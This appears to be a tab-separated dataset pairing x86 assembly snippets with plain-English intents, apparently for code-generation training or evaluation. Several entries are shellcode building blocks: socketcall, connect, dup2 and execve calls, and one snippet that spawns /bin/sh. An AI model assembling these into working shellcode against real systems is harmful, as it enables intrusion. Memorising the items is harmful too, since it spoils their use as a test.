SNIPPETS	INTENTS
mov al, 0x66	move the socketcall in al register
mov al, 0x66	put the syscall socketcall in al register
mov al, 0x66	move the command socketcall = 102 in al register
mov al, 0x66	load __nr_socketcall into al register
mov al, 0x66	load syscall sys_socket into al register
mov al, 0x66	load __nr_socketcall syscall into al register
mov al, 0x66	move socket call number to al register
mov al, 0x66	load setsid syscall into al register
mov al, 0x66	load socketcall sycall into al register
mov al, 0x66	make the socketcall
mov al, 0x66	make the systemcall socketcall
mov al, 0x66	move 0x66 into al
mov al, 0x66	syscall 102
mov al, 0x66	system call socketcall
mov al, 0x66 \n int 80h	execute setsid
mov al, 0x7	move 0x7 into al
mov al, 0x8	put the syscall 0x8 into the al register
mov al, 0xa2	move 0xa2 into al
mov al, 0xb	mov 11 into lower byte of eax
mov al, 0xb	put syscall execve code in al register
mov al, 0xb	load execve in eax
mov al, 0xb	set syscall execve
mov al, 0xb	load __nr_execve syscall number into al register
mov al, 0xb	load __nr_execve syscall into al regisetr
mov al, 0xb	load __nr_execve syscall into al register
mov al, 0xb	load __nr_execve into al register
mov al, 0xb	load the syscall 11 into al register
mov al, 0xb	load execve syscall nimber into al register
mov al, 0xb	execve system call number 11
mov al, 0xb	mov 0xb into lower byte of eax
mov al, 0xb	move 0xb into al
mov al, 0xb \n int 0x80	load __nr_execve into al register and ping kernel
mov al, 0xb \n int 0x80	load execve syscall number into al register and ping kernel
mov al, 0xb \n int 0x80	execute the file
mov al, 0xb \n int 0x80	execute sys_execve(11)
mov al, 0xb \n int 0x80	execute __nr_execve syscall
mov al, 0xb \n int 0x80	execute execve syscall
mov al, 0xb5	move 0xb5 into al
mov al, 0xcd	move 0xcd into al
mov al, 0xcd \n mov ah, 0x80	load int 0x80 into eax register
mov al, 0xf	move the function chmod in al register
mov al, 0xf	load chmod syscall number into al register
mov al, 0xf	move 0xf into al
mov al, 1	copy 1 in al
mov al, 1	move syscalll exit in a reegister
mov al, 1	move the number of the syscall exit in al register
mov al, 1	move the value 1 into the al register
mov al, 1	move 1 into al
mov al, 10	transfer the value 10 to the al register
mov al, 102	load the system call socketcall in al register
mov al, 102	load syscall for socketcall() 102 into al register
mov al, 102	make syscall for socketcall()
mov al, 102	load socketcall syscall number into al register
mov al, 102	load socketcall syscall into al register
mov al, 102	move 102 into al
mov al, 102 \n int 80h	execyte socketcall syscall
mov al, 11	insert execve code in al register
mov al, 11	put syscall execve code in al register
mov al, 11	load the execve syscall number into al register
mov al, 11	load syscall execve number into al register
mov al, 11	load the value 11 into al register
mov al, 11	make execve() syscall or 11
mov al, 11	save into al register execve system call
mov al, 11	put the syscall 11 into the al register
mov al, 11	move the value 11 into the al register
mov al, 11 \n int 0x80	call the execve syscall
mov al, 11 \n int 0x80	execute __nr_execve syscall
mov al, 11 \n int 0x80	execyte __nr_execve syscall
mov al, 11 \n int 0x80	execute execv syscall
mov al, 11 \n int 0x80	execute execve syscall
mov al, 11 \n push edx \n push 0x68732f6e \n push 0x69622f2f \n mov ebx,esp \n push edx \n push ebx \n mov ecx,esp \n int 0x80	execute shell using execve syscall
mov al, 12	move 12 into al
mov al, 15	move 15 into lower byte of the eax register
mov al, 16	move 16 into al
mov al, 2	move 2 into al
mov al, 2 \n int 80h	execute fork syscall
mov al, 20	move 20 into al
mov al, 23	move 23 into al
mov al, 37	move 37 into al
mov al, 39	move 39 into al
mov al, 4	move the number of the syscall write in al register
mov al, 4	store 4 into al
mov al, 4	move 4 into al
mov al, 5	load the code of syscall open in al register
mov al, 5	move 5 into al
mov al, 5 \n dec al \n jnz l2	move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero
mov al, 54	move 54 into al
mov al, 6	move the number of the syscall close in al register
mov al, 6	move 6 into al
mov al, 6 \n int 80h	execute close sycall
mov al, 61	move 61 into al
mov al, 63	load syscall for dup2()
mov al, 63	load into al register the syscall for dup2
mov al, 63	move the dup2 syscall into al register
mov al, 63	load dup2 syscall into al register
mov al, 63	save 63 into al
mov al, 63 \n int 0x80	move the code of syscall dup2 in al register and execute
mov al, 66h	move 66h into al
mov al, 70	move 70 into al
mov al, 72h	move 72h into al
mov al, 99	move 99 into al
mov al, a_letter	move data at memory location a_letter into al
mov al, byte [digits+eax]	move the effective address of digits+eax into al
mov al, byte [edi]	move the byte in edi into the al register
mov al, byte [edx+ecx]	move the effective address edx+ecx into al
mov al, byte [esi]	sabe shellcode lenght into al register
mov al, byte [esi]	move the byte at the address [esi] into al
mov al, byte [esi]	move the byte in esi into the al register
mov al, byte [esi]	move the byte in esi into al
mov al, byte [esi]	load the byte pointed by esi in al
mov al, byte [esi+1+ebp]	move the byte at the memory location specified by the operation [esi+1+ebp] into al
mov al, byte [esi+1+ebp]	put the byte at the address esi+1+ebp into al
mov al, byte [esi+ecx]	move a byte from the address esi+ecx into al
mov al, byte 0bh	move the byte 0bh into al
mov al, byte 0bh	move the byte at the address 0bh into al
mov al, byte 0x1	move the byte at the address 0x1 into al
mov al, byte 2ah	move the byte 2ah into al
mov al, byte 2ah	move the byte at the address 2ah into al
mov al, byte 2h	move the byte 2h into al
mov al, byte 2h	move the byte at the address 2h into al
mov al, byte 3fh	move the byte 3fh into al
mov al, byte 3fh	move the byte at the address 3fh into al
mov al, byte 3h	move the byte 3h into al
mov al, byte 3h	move the byte at the address 3h into al
mov al, byte 66h	move the byte 66h into al
mov al, byte 66h	move the byte at the address 66h into al
mov al, byte 6h	move the byte 6h into al
mov al, byte 6h	move the byte at the address 6h into al
mov al, byte[buff+ecx]	move a byte from the address buff+ecx into al
mov al, cl	move cl into al
mov al, cl	backup cl into al
mov al, close_syscall	move close_syscall into al
mov al, dl	move dl into al
mov al, dl	move dl to al
mov al, dl	copy the contents of dl into al
mov al, exit_call	load exit in al register
mov al, exit_call	move exit_call into al
mov al, write_syscall	move write_syscall into al
mov al,0x01	move 1 into lower byte of each
mov al,0x04	load the sys call to write the file
mov al,0x0b	copy execve syscall number into al register
mov al,0x1	put 1 in al register
mov al,0x1	load exit in al register
mov al,0x1	copy hexadecimal value 0x1 into al register
mov al,0x1	copy the code of the syscall exit into al reegister
mov al,0x1 \n add al,0xa	put syscall execve code in al register
mov al,0x3	copy the code of the syscall read into al register
mov al,0x33	load the code 0x33 of the syscall acct in al register
mov al,0x3f	load __nr_dup2 into al register
mov al,0x3f	load syscall duo2 into al register
mov al,0x4	put 4 in al regsiter
mov al,0x4	copy the code of the syscall write into al register
mov al,0x4	move the value 0x4 into al register
mov al,0x4	load __nr_write into al register
mov al,0x5	copy the code of syscall open to al register
mov al,0x5	copy the value 5 into al register
mov al,0x6	move syscall close in al register
mov al,0x6	copy close syscall number into al register
mov al,0x6	load __nr_close into al register
mov al,0x66	move the command socketcall in al register
mov al,0x66	copy socketcall syscall number into al register
mov al,0x66	load __nr_socketcall into al register
mov al,0x8	load __nr_creat syscall into al register
mov al,0x8 \n mov cl,077o	reate the file with 77 permission in octal
mov al,0xa2 \n int 0x80	execute nanosleep
mov al,0xa2 \n int 80h	execute nanosleep syscall
mov al,0xb	load execve in al register
mov al,0xb	put syscall execve code in al register
mov al,0xb	load execve syscall number into al register
mov al,0xb	set syscall execve
mov al,0xb	load __nr_execve syscall into al regisetr
mov al,0xb	load execve syscall number into al regsiter
mov al,0xb	load __nr_execve on stack
mov al,0xb	load __nr_execve syscall into al register
mov al,0xb \n int 0x80	execute execve syscall
mov al,0xf	load __nr_chmod into al register
mov al,0xf	load chmod syscall into al register
mov al,1 \n int 80h	execute execve syscall
mov al,102	load __nr_socketcall syscall into al register
mov al,11	load execve syscall into al register
mov al,11 \n int 0x80	execute __nr_execve syscall
mov al,11 \n int 0x80	execute execves yscall
mov al,11 \n int 0x80	execute execve syscall
mov al,2	load __nr_fork into al regsiter
mov al,63	load dup2 syscall into al register
mov al,63 \n int 80h	load dup2 syscall into al register and call kernel
mov al,byte 0x1	coy the byte 1 into al register
mov al,byte ptr [edi]	access memory at the adress edi and copy the byte into al register
mov al,close_syscall	move the value close_syscall to al register
mov al,write_syscall	move the value write_syscall to al register
mov ax, [1000h]	load the object at the address 1000h into the ax register
mov ax, [di]	copy thevalue at memory address specified by di into ax
mov ax, [esi]	move current word from encoded_shellcode to ax
mov ax, [esi]	move the contents at the address pointed by esi into the ax register
mov ax, [esi]	move the contents at the address stored in esi into the ax register
mov ax, [esi]	store the contents at the address pointed by esi into the ax register
mov ax, [my_var]	copy my_var contents in ax
mov ax, 00	initialize ax to 00
mov ax, 010ch	move value of 0x010ch into the register ax
mov ax, 0x167	insert in ax register the syscall _nr_socket /socket syscall number
mov ax, 0x167	load _nr_socket into ax regsiter
mov ax, 0x167	move 0x167 into ax
mov ax, 0x169	move bind syscall number in ax register
mov ax, 0x169	move 0x169 into ax
mov ax, 0x16a	insert in ax register the value 0x16a/connect syscall number
mov ax, 0x16a	insert in ax register the connect syscall number
mov ax, 0x16a	move 0x16a into ax
